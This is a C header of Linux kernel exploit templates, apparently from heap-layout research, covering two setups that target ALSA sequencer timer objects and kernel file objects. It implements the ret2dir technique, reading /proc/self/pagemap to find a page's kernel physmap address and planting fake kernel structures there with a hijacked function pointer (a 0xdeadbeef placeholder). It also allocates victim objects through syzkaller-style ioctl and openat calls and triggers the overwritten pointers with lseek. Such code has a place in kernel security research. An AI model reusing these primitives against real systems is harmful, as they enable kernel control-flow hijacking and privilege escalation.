#ifndef _SEQ_FILE_TMPL_H_
#define _SEQ_FILE_TMPL_H_

#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <memory.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

// for ret2dir
#define PHYS_OFFSET 0xffff880000000000
#define PFN_MIN 0
#define PAGE_SIZE 0x1000
#define USER_ADDR 0x40000000
#define PAGE_SHIFT 12

#define KMALLOC_SIZE 192

#ifdef FENGSHUI1

struct snd_seq_timer {
    char hole1[0x50];
    void *timeri;
    char hole2[0x30];
};

struct snd_timer_instance {
	char hole1[0x20];
    void* private_free;
	char hole2[0xa8];
};
struct snd_seq_timer fake_snd_seq_timer;
struct snd_timer_instance fake_snd_timer_instance;

unsigned overwrite_start = 0x50+KMALLOC_SIZE;
unsigned overwrite_end = 0x58+KMALLOC_SIZE;

void* victim_obj = (void*)&fake_snd_seq_timer;

int fd[2];
uint64_t kaddr = 0;

uint64_t r[2] = {0x0, 0xffffffffffffffff};

static long syz_open_dev(long a0, long a1, long a2)
{
  if (a0 == 0xc || a0 == 0xb) {
    char buf[128];
    sprintf(buf, "/dev/%s/%d:%d", a0 == 0xc ? "char" : "block", (uint8_t)a1,
            (uint8_t)a2);
    return open(buf, O_RDWR, 0);
  } else {
    char buf[1024];
    char* hash;
    strncpy(buf, (char*)a0, sizeof(buf) - 1);
    buf[sizeof(buf) - 1] = 0;
    while ((hash = strchr(buf, '#'))) {
      *hash = '0' + (char)(a1 % 10);
      a1 /= 10;
    }
    return open(buf, a2, 0);
  }
}

void do_setup_physmap() {

  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;
  memcpy((void*)0x200002c0, "/dev/snd/seq", 13);
  res = syz_open_dev(0x200002c0, 0, 0);
  if (res != -1)
	r[1] = res;

    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
		goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
		memset(&fake_snd_seq_timer, 0x00, sizeof(struct snd_seq_timer));
		fake_snd_seq_timer.timeri = (void*)kaddr;
		fake_snd_timer_instance.private_free = (void*)0xffffffffdeadbeef;
		memset((void*)USER_ADDR, 0xff, PAGE_SIZE);
		memcpy((void*)USER_ADDR, &fake_snd_timer_instance, sizeof(struct snd_timer_instance));
    }
	return;
err:
	close(fd);
	exit(-1);
}



void do_alloc_victim() {
  *(uint32_t*)0x20000300 = 8;
  *(uint32_t*)0x20000304 = 7;
  *(uint32_t*)0x20000308 = 0x11c;
  memcpy((void*)0x2000030c,
         "\x71\x75\x65\x75\x65\x30\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"
         "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00",
         64);
  *(uint32_t*)0x2000034c = 0x401;
  *(uint8_t*)0x20000350 = 0;
  *(uint8_t*)0x20000351 = 0;
  *(uint8_t*)0x20000352 = 0;
  *(uint8_t*)0x20000353 = 0;
  *(uint8_t*)0x20000354 = 0;
  *(uint8_t*)0x20000355 = 0;
  *(uint8_t*)0x20000356 = 0;
  *(uint8_t*)0x20000357 = 0;
  *(uint8_t*)0x20000358 = 0;
  *(uint8_t*)0x20000359 = 0;
  *(uint8_t*)0x2000035a = 0;
  *(uint8_t*)0x2000035b = 0;
  *(uint8_t*)0x2000035c = 0;
  *(uint8_t*)0x2000035d = 0;
  *(uint8_t*)0x2000035e = 0;
  *(uint8_t*)0x2000035f = 0;
  *(uint8_t*)0x20000360 = 0;
  *(uint8_t*)0x20000361 = 0;
  *(uint8_t*)0x20000362 = 0;
  *(uint8_t*)0x20000363 = 0;
  *(uint8_t*)0x20000364 = 0;
  *(uint8_t*)0x20000365 = 0;
  *(uint8_t*)0x20000366 = 0;
  *(uint8_t*)0x20000367 = 0;
  *(uint8_t*)0x20000368 = 0;
  *(uint8_t*)0x20000369 = 0;
  *(uint8_t*)0x2000036a = 0;
  *(uint8_t*)0x2000036b = 0;
  *(uint8_t*)0x2000036c = 0;
  *(uint8_t*)0x2000036d = 0;
  *(uint8_t*)0x2000036e = 0;
  *(uint8_t*)0x2000036f = 0;
  *(uint8_t*)0x20000370 = 0;
  *(uint8_t*)0x20000371 = 0;
  *(uint8_t*)0x20000372 = 0;
  *(uint8_t*)0x20000373 = 0;
  *(uint8_t*)0x20000374 = 0;
  *(uint8_t*)0x20000375 = 0;
  *(uint8_t*)0x20000376 = 0;
  *(uint8_t*)0x20000377 = 0;
  *(uint8_t*)0x20000378 = 0;
  *(uint8_t*)0x20000379 = 0;
  *(uint8_t*)0x2000037a = 0;
  *(uint8_t*)0x2000037b = 0;
  *(uint8_t*)0x2000037c = 0;
  *(uint8_t*)0x2000037d = 0;
  *(uint8_t*)0x2000037e = 0;
  *(uint8_t*)0x2000037f = 0;
  *(uint8_t*)0x20000380 = 0;
  *(uint8_t*)0x20000381 = 0;
  *(uint8_t*)0x20000382 = 0;
  *(uint8_t*)0x20000383 = 0;
  *(uint8_t*)0x20000384 = 0;
  *(uint8_t*)0x20000385 = 0;
  *(uint8_t*)0x20000386 = 0;
  *(uint8_t*)0x20000387 = 0;
  *(uint8_t*)0x20000388 = 0;
  *(uint8_t*)0x20000389 = 0;
  *(uint8_t*)0x2000038a = 0;
  *(uint8_t*)0x2000038b = 0;
  syscall(__NR_ioctl, r[1], 0xc08c5332, 0x20000300);
}

void do_hijack() {
	exit(0);
}

#endif // FENGSHUI1

#ifdef FENGSHUI4
struct file {
    char hole1[0x28];
    void *f_op;
    char hole2[0x14];
    unsigned int f_mode;
    char hole3[0xb8];
};

struct file_operations {
    char hole1[0x8];
    void* llseek;
    void* read;
    char hole2[0xd8];
};
struct file fake_file;
struct file_operations fake_file_operations;

unsigned overwrite_start = 0x0;
unsigned overwrite_end = 0x30;

int fd[64];
uint64_t kaddr = 0;

void do_setup_physmap() {
    void* uaddr = (void*)USER_ADDR;
    void* raddr = NULL;
    void* ret = NULL;
    char file_name[30];
    sprintf(file_name, "/proc/%d/pagemap", getpid());
    int fd = open(file_name, O_RDONLY);
    if (fd < 0) {
        perror("open failed");
		goto err;
    }
    uint64_t v = 0;
    uint64_t pfn = 0;

    munmap(uaddr, PAGE_SIZE);
    raddr = mmap(uaddr, PAGE_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANON, -1, 0);
    if(raddr == MAP_FAILED) {
        perror("mmap failed");
        goto err;
    }
    // necessary due to lazy allocation
    memset(raddr, 0, PAGE_SIZE);
    lseek(fd, ((uint64_t)uaddr >> PAGE_SHIFT)*sizeof(uint64_t), SEEK_SET);
    read(fd, &v, sizeof(uint64_t));
    if (v & (1UL << 63)) {
        pfn = v & ((1UL << 55) - 1);
        fprintf(stdout, "pfn: 0x%lx\n", pfn);
        kaddr = PHYS_OFFSET + 0x1000 * (pfn-PFN_MIN);
        fprintf(stdout, "kaddr: 0x%lx\n", kaddr);
        ret = (void*)kaddr;
		memset(&fake_file, 0x00, sizeof(struct file));
		fake_file.f_op = (void*)(kaddr+sizeof(struct file));
		fake_file.f_mode = 0x5801e;

		fake_file_operations.llseek = (void*)0xffffffffdeadbeef;
		memset((void*)USER_ADDR, 0x00, PAGE_SIZE);
		memcpy((void*)USER_ADDR+sizeof(struct file), &fake_file_operations, sizeof(struct file_operations));
    }
	return;
err:
	close(fd);
	exit(-1);
}

static uint64_t r[1] = {0xffffffffffffffff};


/*
 *  open files to allocate file structures and
 *  cause allocation of at least one new slab which is right after
 *  the second block
 */
void do_alloc_victim() {
  syscall(__NR_mmap, 0x20000000, 0x1000000, 3, 0x32, -1, 0);
  long res = 0;
  memcpy((void*)0x20000000, "/selinux/avc/cache_stats", 25);
  res = syscall(__NR_openat, 0xffffffffffffff9c, 0x20000000, 0, 0);
  if (res != -1)
    r[0] = res;
	return;
}

void set_freelist() {
	int fd[2];
	fd[0] = open("test1", O_CREAT);
	fd[1] = open("test2", O_CREAT);

	close(fd[0]);
	close(fd[1]);

}

void do_hijack() {
	// overflow will occupy some bytes of the file object
	// right before victim file object which makes it 
	// fragile. Therefore, we lseek inversely
	memcpy((void*)USER_ADDR, &fake_file, sizeof(struct file));
	int i = 0;
	for (i = 63; i >= 0; i--) {
		lseek(fd[i], 0, SEEK_SET);
	}
}

#endif // FENGSHUI4

#endif
